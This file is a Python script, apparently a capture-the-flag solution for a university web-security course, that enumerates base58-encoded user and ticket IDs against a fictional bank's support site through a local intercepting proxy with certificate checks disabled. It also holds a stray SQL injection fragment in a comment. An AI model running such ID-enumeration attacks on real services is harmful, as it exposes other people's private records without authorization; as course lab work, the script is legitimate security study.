import re
import urllib
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import base58
# /* https://github.com/keis/base58 */

proxy = {
    'https': 'http://127.0.0.1:8080',
    'http': 'http://127.0.0.1:8080'
}

header = {
    "Content-Type": "application/x-www-form-urlencoded"
    # "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
    # "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
}

# Original code uses base58.b58encode(b'str') 
# But since our string is an int, we have to convert to string, then to bytes
# str(i).encode('UTF-8')
# valid_users = []
# for i in range (0, 10000):
#     string = str(i) + ':1'
#     encoded_str = base58.b58encode(string.encode('UTF-8'))
#     request_url = "https://support.quoccabank.com/raw/" + encoded_str.decode('utf-8')
#     r = requests.get(request_url, proxies=proxy, verify=False, headers=header)
#     # if (("b\'Support Ticket").encode('utf-8') in r.content): 
#     print(f'USER:{i} >>>> {r.content}', flush=true)
#     # valid_users.append(i)

# valid_users = ["1", "8", "247", "1125", "1730", "1780", "9447"]
# for user in valid_users: 
for i in range(1, 10000): 
    string = "1125" + ":" + str(i) 
    encoded_str = base58.b58encode(string.encode('UTF-8'))
    request_url = "https://support.quoccabank.com/raw/" + encoded_str.decode('utf-8')
    r = requests.get(request_url, proxies=proxy, verify=False, headers=header)
    # if (("COMP6443{").encode('utf-8') in r.content): 
    print(f'247:{i} >>>> {r.content}', flush=True) 

    # SELECT * FROM '%' OR pname LIKE '%a%') AND bu IS NOT NULL) ORDER BY CATEOGORY'
